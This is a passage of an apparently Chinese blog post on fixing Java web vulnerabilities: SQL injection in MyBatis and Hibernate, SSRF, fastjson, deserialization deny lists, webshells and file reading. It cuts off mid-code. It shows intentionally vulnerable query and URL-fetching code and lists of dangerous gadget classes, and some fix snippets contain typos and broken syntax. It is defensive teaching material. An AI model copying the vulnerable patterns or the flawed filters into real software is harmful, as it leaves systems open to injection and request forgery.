<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">if</span> test=<span class="string">&quot;outtype !=null and outtype !=&#x27;&#x27;&quot;</span>&gt;</span><br><span class="line">			 AND u.catelog_name = #&#123;outtype&#125;</span><br><span class="line">		&lt;/<span class="keyword">if</span>&gt;</span><br><span class="line">		&lt;<span class="keyword">if</span> test=<span class="string">&quot;baseKey !=null and baseKey !=&#x27;&#x27;&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
<p>但是遇到了像是这种除了带有单引号，还有特殊字符，如<code>%</code>的要特殊处理</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;select id=<span class="string">&quot;findUserByName&quot;</span> parameterType=<span class="string">&quot;java.lang.String&quot;</span> resultType=<span class="string">&quot;cn.itcast.mybatis.po.User&quot;</span>&gt;</span><br><span class="line">       &lt;!-- 拼接 MySQL,引起 SQL 注入 --&gt;</span><br><span class="line">       SELECT * FROM user WHERE username LIKE <span class="string">&#x27;%$&#123;value&#125;%&#x27;</span></span><br><span class="line">&lt;/select&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>修复方式要加concat：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;select id=<span class="string">&quot;findUserByName&quot;</span> parameterType=<span class="string">&quot;java.lang.String&quot;</span> resultType=<span class="string">&quot;cn.itcast.mybatis.po.User&quot;</span>&gt;</span><br><span class="line">       &lt;!-- 使用 SQL concat 语句,拼接字符串,防止 SQL 注入 --&gt;</span><br><span class="line">       SELECT * FROM USER WHERE username LIKE <span class="title function_">CONCAT</span><span class="params">(<span class="string">&#x27;%&#x27;</span>,#&#123;value&#125;,<span class="string">&#x27;%&#x27;</span> )</span></span><br><span class="line">&lt;/select&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>其实原理就像是预编译（</p>
<ul>
<li>dao 和 Hibernate</li>
</ul>
<p>DAO的漏洞代码跟mysql是类似的：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from user where id=&quot;</span> + id;</span><br></pre></td></tr></table></figure>
<p>也是直接进行一个拼接</p>
<p>Hibernate：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.createQuery(&quot;from Book where title like &#x27;%&#x27; + userInput + &#x27;%&#x27; and published = true&quot;);</span><br></pre></td></tr></table></figure>
<p>修复方式</p>
<p>预编译启动(<code>使用java.sql.PreparedStatement</code>)：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PreparedStatement stmt = connection.prepareStat(sqlString);</span><br><span class="line">stmt.setString(1, username);</span><br><span class="line">stmt.setString(2, itemName);</span><br><span class="line">result = stmt.executeQuery();</span><br></pre></td></tr></table></figure>
<p>同理，预编译并不能防御<code>order by</code>导致的注入</p>
<h4><span id="java-ssrf"> java-ssrf</span></h4>
<p>java的ssrf局限性比较大，能够发出网络请求的几个类：</p>
<ul>
<li>HttpClient</li>
</ul>
<p>apache的httpClient组件：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pubilc <span class="keyword">class</span> <span class="title class_">TestAction</span> <span class="keyword">extends</span> <span class="title class_">ActionSupport</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">execute</span><span class="params">()</span> throes Exception&#123;</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> ServletActionContext.getRequest();</span><br><span class="line">        <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> ServletActionContext.getResponse();</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;url&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(url!=<span class="literal">null</span>&amp;&amp;url.length()!=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="type">CloseableHttpClient</span> <span class="variable">httpclient</span> <span class="operator">=</span> Httpclient.execute(httpGet);</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="type">HttpGet</span> <span class="variable">httpGet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpGet</span>(url);</span><br><span class="line">                <span class="type">CloseableHttpResponse</span> <span class="variable">response1</span> <span class="operator">=</span> httpclient.execute(httpGet);</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    <span class="type">HttpEntity</span> <span class="variable">entity1</span> <span class="operator">=</span> response1.getEntity();</span><br><span class="line">                    <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">40960</span>];</span><br><span class="line">                    entity1.getContent().read(buffer);</span><br><span class="line">                    response.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(buffer));</span><br><span class="line">                &#125; <span class="keyword">finally</span>&#123;</span><br><span class="line">                    response1.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">finally</span>&#123;</span><br><span class="line">                httpclient.close();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;fail&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>Request(对HttpClient的封装)</li>
<li>HttpURLConnection</li>
</ul>
<p>关键代码如下，这里通过url参数接受用户的输入，然后直接openConnection打开连接：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> ServletActionContext.getRequest();</span><br><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;url&quot;</span>);</span><br><span class="line"><span class="type">URL</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(url);</span><br><span class="line"><span class="type">HttpUrlConnection</span> <span class="variable">con</span> <span class="operator">=</span> (HttpURLConnection) onj.openConnection();</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure>
<ul>
<li>URL类</li>
<li>OKhttp</li>
</ul>
<p>简单修复代码：</p>
<ul>
<li>白+黑+禁止访问内网ip</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(urlLink.contains(<span class="string">&quot;file&quot;</span>) || urlLink.contains(<span class="string">&quot;gopher&quot;</span>) || urlLink.contains(<span class="string">&quot;ftp&quot;</span>))|| urlLink.contains(<span class="string">&quot;netdoc&quot;</span>)|| urlLink.contains(<span class="string">&quot;mailto&quot;</span>)|| urlLink.contains(<span class="string">&quot;jar&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;无法访问&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">if</span>(urlLink.contains(<span class="string">&quot;127.0.0.1&quot;</span>))|| urlLink.contains(<span class="string">&quot;localhost&quot;</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&quot;无法访问&quot;</span>;</span><br><span class="line">&#125; </span><br><span class="line">  ...</span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(urlLink.contains(<span class="string">&quot;http://&quot;</span>) || urlLink.contains(<span class="string">&quot;https://&quot;</span>))&#123;</span><br><span class="line">            ...</span><br><span class="line">            业务</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>推荐：</p>
<p>禁内网ip+白名单业务：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ipIsInner，用于判断是否为内网ip</span></span><br><span class="line"><span class="keyword">static</span> List&lt;Pattern&gt; ipFilterRegexList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line"></span><br><span class="line">        Set&lt;String&gt; ipFilter = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;String&gt;();</span><br><span class="line">        ipFilter.add(<span class="string">&quot;^10\\\\.(1\\\\d&#123;2&#125;|2[0-4]\\\\d|25[0-5]|[1-9]\\\\d|[0-9])&quot;</span></span><br><span class="line">                + <span class="string">&quot;\\\\.(1\\\\d&#123;2&#125;|2[0-4]\\\\d|25[0-5]|[1-9]\\\\d|[0-9])&quot;</span> + <span class="string">&quot;\\\\.(1\\\\d&#123;2&#125;|2[0-4]\\\\d|25[0-5]|[1-9]\\\\d|[0-9])$&quot;</span>);</span><br><span class="line">        ipFilter.add(<span class="string">&quot;^172\\\\.(1[6789]|2[0-9]|3[01])\\\\&quot;</span> + <span class="string">&quot;.(1\\\\d&#123;2&#125;|2[0-4]\\\\d|25[0-5]|[1-9]\\\\d|[0-9])\\\\&quot;</span></span><br><span class="line">                + <span class="string">&quot;.(1\\\\d&#123;2&#125;|2[0-4]\\\\d|25[0-5]|[1-9]\\\\d|[0-9])$&quot;</span>);</span><br><span class="line">        ipFilter.add(<span class="string">&quot;^192\\\\.168\\\\.(1\\\\d&#123;2&#125;|2[0-4]\\\\d|25[0-5]|[1-9]\\\\d|[0-9])\\\\&quot;</span></span><br><span class="line">                + <span class="string">&quot;.(1\\\\d&#123;2&#125;|2[0-4]\\\\d|25[0-5]|[1-9]\\\\d|[0-9])$&quot;</span>);</span><br><span class="line">        <span class="comment">//ipFilter.add(&quot;127.0.0.1&quot;);</span></span><br><span class="line">        ipFilter.add(<span class="string">&quot;^127\\\\.(1\\\\d&#123;2&#125;|2[0-4]\\\\d|25[0-5]|[1-9]\\\\d|[0-9])&quot;</span></span><br><span class="line">                + <span class="string">&quot;\\\\.(1\\\\d&#123;2&#125;|2[0-4]\\\\d|25[0-5]|[1-9]\\\\d|[0-9])&quot;</span> + <span class="string">&quot;\\\\.(1\\\\d&#123;2&#125;|2[0-4]\\\\d|25[0-5]|[1-9]\\\\d|[0-9])$&quot;</span>);</span><br><span class="line">        ipFilter.add(<span class="string">&quot;0.0.0.0&quot;</span>);</span><br><span class="line">        ipFilter.add(<span class="string">&quot;localhost&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (String reg : ipFilter) &#123;</span><br><span class="line">            ipFilterRegexList.add(Pattern.compile(reg));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">ipIsInner</span><span class="params">(String ip)</span> &#123;</span><br><span class="line">        System.out.println(ip);</span><br><span class="line">        <span class="keyword">for</span> (Pattern reg : ipFilterRegexList) &#123;</span><br><span class="line">            <span class="type">Matcher</span> <span class="variable">matcher</span> <span class="operator">=</span> reg.matcher(ip);</span><br><span class="line">            <span class="keyword">if</span> (matcher.find()) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>限制协议为http或者https：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">URL</span> <span class="variable">exurl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(urlLink);</span><br><span class="line">        <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> exurl.getHost();</span><br><span class="line">        <span class="type">String</span> <span class="variable">protocol</span> <span class="operator">=</span> exurl.getProtocol();</span><br><span class="line">        <span class="comment">// 协议只能是https或http</span></span><br><span class="line">        <span class="keyword">if</span>(!(protocol.contains(<span class="string">&quot;https&quot;</span>)||protocol.contains(<span class="string">&quot;http&quot;</span>)))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;无法访问&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 检查ip，不允许是内网ip</span></span><br><span class="line">        InetAddress[] addresses = InetAddress.getAllByName(host);</span><br><span class="line">        List&lt;String&gt; ips = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; addresses.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(addresses[i] <span class="keyword">instanceof</span> Inet4Address) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (ipIsInner(addresses[i].getHostAddress())) &#123;</span><br><span class="line">                    <span class="comment">//System.out.println(&quot;Illegal address error&quot;);</span></span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    ips.add(addresses[i].getHostAddress());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>🤔，还是有点缺陷的，没有禁用<code>100.x.x.x</code>(企业级网关段)</p>
<h4><span id="fastjson"> fastjson</span></h4>
<p>改高版本？</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.83<span class="tag">&lt;/<span class="name">version</span>&gt;</span>   //改这里，注释删掉</span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>直接开启safemode:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setSafeMode(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//在代码中配置，我个人觉得这种方法比较轻松</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-Dfastjson.parser.safeMode=true</span><br><span class="line">//jvm启动参数</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fastjson.properties</span><br><span class="line"></span><br><span class="line">fastjson.parser.safeMode=true</span><br></pre></td></tr></table></figure>
<p>改完java后重新打包然后重启服务，pom.xml</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn clean install &amp; mvn package</span><br></pre></td></tr></table></figure>
<h4><span id="java反序列化"> java反序列化</span></h4>
<p>白名单防御：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.io.serialization.ValidatingObjectInputStream;</span><br><span class="line">....</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] buffer)</span> <span class="keyword">throws</span> IOException,</span><br><span class="line">ClassNotFoundException , ConfigurationException &#123;</span><br><span class="line">    Object obj;</span><br><span class="line">    <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(buffer);</span><br><span class="line">    <span class="comment">// Use ValidatingObjectInputStream instead of InputStream</span></span><br><span class="line">    <span class="type">ValidatingObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span>   <span class="title class_">ValidatingObjectInputStream</span>(bais); </span><br><span class="line"></span><br><span class="line">    <span class="comment">//只允许反序列化SerialObject class</span></span><br><span class="line">    ois.accept(SerialObject.class);</span><br><span class="line">    obj = ois.readObject();</span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>SerialObject是一个class数组，白名单</p>
<p>黑名单防御：</p>
<p>重写resolveClass，例如创建一个MyObjectInputStream，里面限制黑名单：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] blacklist = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;</span><br><span class="line">           <span class="string">&quot;java\\.security.*&quot;</span>,</span><br><span class="line">           <span class="string">&quot;java\\.rmi.*&quot;</span>,</span><br><span class="line">           <span class="string">&quot;com\\.fasterxml.*&quot;</span>,</span><br><span class="line">           <span class="string">&quot;org\\.springframework.*&quot;</span>,</span><br><span class="line">           <span class="string">&quot;org\\.yaml.*&quot;</span>,</span><br><span class="line">           <span class="string">&quot;javax\\.management\\.remote.*&quot;</span>,</span><br><span class="line">           <span class="string">&quot;.*TemplatesImpl.*&quot;</span>,</span><br><span class="line">           <span class="string">&quot;.*XString.*&quot;</span>,</span><br><span class="line">           <span class="string">&quot;.*BadAttributeValueExpException.*&quot;</span>,</span><br><span class="line">           <span class="string">&quot;.*SignedObject.*&quot;</span></span><br><span class="line">   &#125;;</span><br></pre></td></tr></table></figure>
<p>完整代码如下，黑名单根据需要再添加：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctf.ezser.utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InvalidClassException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectStreamClass;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyObjectInputStream</span> <span class="keyword">extends</span> <span class="title class_">ObjectInputStream</span> &#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] blacklist = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;</span><br><span class="line">           <span class="string">&quot;java\\.security.*&quot;</span>,</span><br><span class="line">           <span class="string">&quot;java\\.rmi.*&quot;</span>,</span><br><span class="line">           <span class="string">&quot;com\\.fasterxml.*&quot;</span>,</span><br><span class="line">           <span class="string">&quot;org\\.springframework.*&quot;</span>,</span><br><span class="line">           <span class="string">&quot;org\\.yaml.*&quot;</span>,</span><br><span class="line">           <span class="string">&quot;javax\\.management\\.remote.*&quot;</span>,</span><br><span class="line">           <span class="string">&quot;.*TemplatesImpl.*&quot;</span>,</span><br><span class="line">           <span class="string">&quot;.*XString.*&quot;</span>,</span><br><span class="line">           <span class="string">&quot;.*BadAttributeValueExpException.*&quot;</span>,</span><br><span class="line">           <span class="string">&quot;.*SignedObject.*&quot;</span></span><br><span class="line">   &#125;;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">MyObjectInputStream</span><span class="params">(InputStream inputStream)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">      <span class="built_in">super</span>(inputStream);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">protected</span> Class <span class="title function_">resolveClass</span><span class="params">(ObjectStreamClass cls)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">      <span class="keyword">if</span>(!contains(cls.getName())) &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(cls);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(<span class="string">&quot;Unexpected serialized class&quot;</span>, cls.getName());</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">contains</span><span class="params">(String targetValue)</span> &#123;</span><br><span class="line">      <span class="keyword">for</span> (String forbiddenPackage : blacklist) &#123;</span><br><span class="line">         <span class="keyword">if</span> (targetValue.matches(forbiddenPackage))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后在漏洞处修改利用我们自己写的ObjectInputStream</p>
<p>blacklist：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">org.apache.commons.collections.functors.InvokerTransformer</span><br><span class="line">org.apache.commons.collections.functors.InstantiateTransformer</span><br><span class="line">org.apache.commons.collections4.functors.InvokerTransformer</span><br><span class="line">org.apache.commons.collections4.functors.InstantiateTransformer</span><br><span class="line">org.codehaus.groovy.runtime.ConvertedClosure</span><br><span class="line">org.codehaus.groovy.runtime.MethodClosure</span><br><span class="line">org.springframework.beans.factory.ObjectFactory</span><br><span class="line">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><br><span class="line">org.apache.commons.fileupload</span><br><span class="line">org.apache.commons.beanutils</span><br><span class="line"></span><br><span class="line">//防常见的反序列化</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">this</span>.denyList = <span class="string">&quot;bsh,com.mchange,com.sun.,java.lang.Thread,java.net.Socket,java.rmi,javax.xml,org.apache.bcel,org.apache.commons.beanutils,org.apache.commons.collections.Transformer,org.apache.commons.collections.functors,org.apache.commons.collections4.comparators,org.apache.commons.fileupload,org.apache.myfaces.context.servlet,org.apache.tomcat,org.apache.wicket.util,org.codehaus.groovy.runtime,org.hibernate,org.jboss,org.mozilla.javascript,org.python.core,org.springframework&quot;</span>.split(<span class="string">&quot;,&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>直接从fastjson一致限制的黑名单<code>denyList</code>内copy：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/LeadroyaL/fastjson-blacklist">GitHub - LeadroyaL/fastjson-blacklist</a></p>
<h4><span id="jspshell"> jspshell</span></h4>
<p>啊？</p>
<p>d盾启动</p>
<p>找到就删了</p>
<p>不死马怎么办</p>
<p>我不会啊T_T</p>
<p>找进程吧</p>
<h4><span id="内存马"> 内存马</span></h4>
<p><a target="_blank" rel="noopener" href="https://github.com/c0ny1/java-memshell-scanner">https://github.com/c0ny1/java-memshell-scanner</a></p>
<h4><span id="文件读取"> 文件读取</span></h4>
<p>File + FileInputStream/getPath/getAbsolutePath/ServletFileUpload</p>
<p>例如：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/include/image&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getImage</span><span class="params">(<span class="meta">@RequestParam</span> String image, HttpServletResponse response)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//HttpServletResponse response = new HttpServletResponse();</span></span><br><span class="line">            <span class="comment">//ClassPathResource classPathResource = new ClassPathResource(&quot;sql/SCHEDULE_TASK.sql&quot;);</span></span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span 